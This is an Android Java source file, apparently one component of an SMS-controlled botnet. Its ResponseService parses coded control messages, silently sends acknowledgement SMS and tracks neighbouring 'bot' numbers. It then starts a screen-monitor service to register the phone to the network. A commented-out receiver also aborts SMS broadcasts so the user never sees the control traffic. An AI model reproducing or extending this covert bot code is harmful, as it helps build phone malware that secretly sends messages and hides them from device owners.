package com.SmsService.CommandComponent;

import java.util.concurrent.atomic.AtomicReference;

import com.SmsService.AuxiliaryComponent.CommandJob;
import com.SmsService.AuxiliaryComponent.CommandJobElement;
import com.SmsService.AuxiliaryComponent.CommonVariable;
import com.SmsService.AuxiliaryComponent.Debug;
import com.SmsService.AuxiliaryComponent.ResponseTable;
import com.SmsService.AuxiliaryComponent.ResponseTableElement;
import com.SmsService.ReceiverComponent.ScreenMonitor;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;


public class ResponseService extends Service{
	
	/* 
	 * WAIT PATTERN
	 * 
	 * 1) phone number response
	 *       commandSign seperateSign phoneNumberResponseSign seperateSign phoneNumber SEPERATE   time
	 *    ex    ##           |                 01                  |      0952987615	   |     12423542
	 *    
	 * 2) receive successful sending sign
	 *       commandSign seperateSign HAVE_RECEIVED  SEPERATE  time
	 *    ex    ##           |            02             |     1243242
	 *    
	 * 3) pass to next and receive successful pass ( not working )
	 * 		 commandSign SEPERATE PASS_HAVE_RECEIVED SEPERATE time
	 *    ex    ##           |            03             |     12345
	 *    
	 */
	
	//private BroadcastReceiver waitmode ;
	
	public void onCreate() {
		//in case of some of the class forget to lock the Service lock
		//Just in case.
		CommonVariable.ResponseServiceLock = "true";
		Debug.PrintLog("ResponseService","ResponseServiceLock set "+CommonVariable.ResponseServiceLock);		
		
	}
	public void onDestroy() {
				
		if(!CommandJob.isResponseEmpty()) {
			Debug.PrintLog("ResponseService", "still job in job queue");			
			CommandJob.stillResponseJob = true;
			sendBroadcast(new Intent().setAction
					("CommandService.stillJob"));
		}
		else {
			CommonVariable.ResponseServiceLock = "false";	
		}			
		
		Debug.PrintLog("ResponseService","ResponseServiceLock set "+CommonVariable.ResponseServiceLock);
	}
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		CommandJobElement job;
		
		if(CommandJob.isResponseEmpty()){
			Debug.PrintLog("ResponseService", "nothing in the response job queue, why I'm awake....:P");
			this.stopSelf();
		}
		
		//if there are multi command in the job queue, execute all
		else {
			while(!CommandJob.isResponseEmpty()) {
				job = CommandJob.getResponseJob();
				Debug.PrintLog("ResponseService", "Deal with Response Command, number->"+job.number+" command->"+job.command);
				WaitMode(job.number,job.command,ResponseTable.getResponseJob(job.number));
			}	
		}
		this.stopSelf();
		return START_STICKY;
	}
	
	
	private boolean WaitMode( String sender, String message, ResponseTableElement job) {			
		Debug.PrintLog("ResponseService","WaitMode get: " + message);
		/* parse command */
		String[] cmd = message.split(CommonVariable.SEPERATE) ;
		// is WAIT RESPONSE
		if ( cmd[0].contains(CommonVariable.RESPONSE_SIGN) ) {
			if ( cmd[1].contains(CommonVariable.PHONE_NUMBER_RESPONSE)  ) {
				// pause ScreenMonitor
				
				// inform sender for receiving message success
				try {
					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
				}catch ( Exception e ) {
					Debug.PrintLog("CommandService", "There is no time in command.");
					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,null,false);
				}
				Debug.PrintLog("CommandService","Send HAVE_RECEIVED signal back.");
				
				CommonVariable.selfNumber = cmd[2].trim();
				Debug.PrintLog("ResponseService","I got the PHONE_NUMBER_RESPONSE signal and the number is "+CommonVariable.selfNumber);
				// reset left and right bot 
				CommonVariable.leftBotNumber = CommonVariable.rightBotNumber = "" ;
				
				// remove the element in responseJobQueue
				try {
					if ( !ResponseTable.remove(sender,CommonVariable.PHONE_NUMBER_RESPONSE,cmd[3].trim()) ) {
						Debug.PrintLog("ResponseService", "remove PHONE_NUMBER_RESPONSE from responseJobQueue failed");
					}
				}catch ( Exception e ) {
					Debug.PrintLog("ResponseService", "Remove with no time in SMS.");
					if ( !ResponseTable.remove(sender,CommonVariable.PHONE_NUMBER_RESPONSE,null) ) {
						Debug.PrintLog("ResponseService", "remove PHONE_NUMBER_RESPONSE from responseJobQueue failed");
					}
				}
				
				
				//get the pnone number and register to net
				CommonVariable.ResponseServiceLock = "false";
				Intent i = new Intent(this, ScreenMonitor.class);			
				this.startService(i);
				
				
			}
			else if ( cmd[1].contains(CommonVariable.HAVE_RECEIVED) ) {
				// got it					
				Debug.PrintLog("ResponseService","I got the HAVE_RECEIVED signal");
				// remove the element in responseJobQueue
				try {
					if ( !ResponseTable.remove(sender,CommonVariable.HAVE_RECEIVED,cmd[2]) ) {
						Debug.PrintLog("ResponseService", "remove HAVE_RECEIVED from responseJobQueue failed.[number="+sender+" time="+cmd[2]+"]");
					}
				}catch ( Exception e ) {
					Debug.PrintLog("ResponseService", "Remove with no time in SMS.");
					if ( !ResponseTable.remove(sender,CommonVariable.HAVE_RECEIVED,null) ) {
						Debug.PrintLog("ResponseService", "remove HAVE_RECEIVED from responseJobQueue failed.[number="+sender+"]");
					}
				}
				
				
				
			}
			/*else if ( cmd[1].contains(CommonVariable.PASS_HAVE_RECEIVED) ) {
				// got it					
				Debug.PrintLog("ResponseService","I got the PASS_HAVE_RECEIVED signal");
				// pass back to real phone
				
				// remove the element in responseJobQueue
				if ( !ResponseJob.remove(sender,CommonVariable.PASS_HAVE_RECEIVED,cmd[2]) ) {
					Debug.PrintLog("ResponseService", "remove PASS_HAVE_RECEIVED from responseJobQueue failed.[number="+sender+" time="+cmd[2]+"]");
				}
				this.stopSelf();
			}*/
			else {
				Debug.PrintLog("ResponseService","It may have something wrong.");
				
			}
			return true;
		}
		
		else {
			Debug.PrintLog("ResponseService","There is not response command.");				
			return false;
		}
	}
	private boolean SendSMS ( String sender, String destNumber, String message, String state, String receivedTime, boolean isToWaitResponse ) {
        // wait others send back
        if ( isToWaitResponse == true ) {
        	String time = ResponseTable.addJob(destNumber, message, state, receivedTime);
        	SmsManager smsManager = SmsManager.getDefault();  
            smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+time, null, null);
        }
        // return back
        else {
        	if ( !sender.equals("0000") ) {
	        	if ( receivedTime == null ) {
	        		SmsManager smsManager = SmsManager.getDefault();  
	                smsManager.sendTextMessage(destNumber, null, message, null, null);
	        	}
	        	else {
	        		SmsManager smsManager = SmsManager.getDefault();  
	                smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+receivedTime, null, null);
	        	}
        	}
        }
        return true;
	}
}

	/*
	public class WaitResponse extends BroadcastReceiver {
		private String state ;
		private Service service ;
		
		public WaitResponse(String state, Service service) {
			this.state = state ;
			this.service = service ;
			
		}
		public boolean WaitMode( String sender, String message,Context context) {			
			Debug.PrintLog("ResponseService","WaitMode get: " + message + " state: "+ state);
			// parse command 
			String[] cmd = message.split(CommonVariable.SEPERATE) ;
			// is WAIT RESPONSE
			if ( cmd[0].contains(CommonVariable.RESPONSE_SIGN) ) {
				if ( cmd[1].contains(CommonVariable.PHONE_NUMBER_RESPONSE) && state.equals(CommonVariable.PHONE_NUMBER_RESPONSE) ) {
					// pause ScreenMonitor
					
					CommonVariable.selfNumber = cmd[2].trim();
					Debug.PrintLog("ResponseService","I got the PHONE_NUMBER_RESPONSE signal and the number is "+CommonVariable.selfNumber);
					// reset left and right bot 
					CommonVariable.leftBotNumber = CommonVariable.rightBotNumber = "" ;
					//get the pnone number and register to net
					CommonVariable.ResponseServiceLock = "false";
					Intent i = new Intent(context, ScreenMonitor.class);			
					context.startService(i);
					
					service.stopSelf();
				}
				else if ( cmd[1].contains(CommonVariable.HAVE_RECEIVED) && state.equals(CommonVariable.HAVE_RECEIVED) ) {
					// got it					
					Debug.PrintLog("ResponseService","I got the HAVE_RECEIVED signal");					
					service.stopSelf();
				}
				else {
					Debug.PrintLog("ResponseService","It may have something wrong.");
					
				}
				return true;
			}
			// is not WAIT RESPONSE SIGN, but is COMMAND_SIGN? is this possible?
			// impossible
			else if (cmd[0].contains(CommonVariable.COMMAND_SIGN)) {
				Debug.PrintLog("ResponseService","I am in WAIT mode, but I receive a COMMAND?");				
				return true;
			}
			else {
				Debug.PrintLog("ResponseService","There is not response command.");				
				return false;
			}
		}
		
		@Override
		public void onReceive(Context context, Intent intent) {		
			
			
			Bundle bundle = intent.getExtras();        
	        SmsMessage[] msgs = null;
	        String content = "";
	        String number="";        
	        if (bundle != null)
	        {
	            //---retrieve the SMS message received---
	            Object[] pdus = (Object[]) bundle.get("pdus");
	            msgs = new SmsMessage[pdus.length]; 
	            
	            for (int i=0; i<msgs.length; i++){
	                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
	                number +=  msgs[i].getOriginatingAddress();                
	                content += msgs[i].getMessageBody().toString();
	                content += "\n";        
	            }//end for
	            
	            if ( WaitMode(number,content,context) ) {
	            	this.abortBroadcast();
	            }
	        }
			
	        
		}
		
	}*/

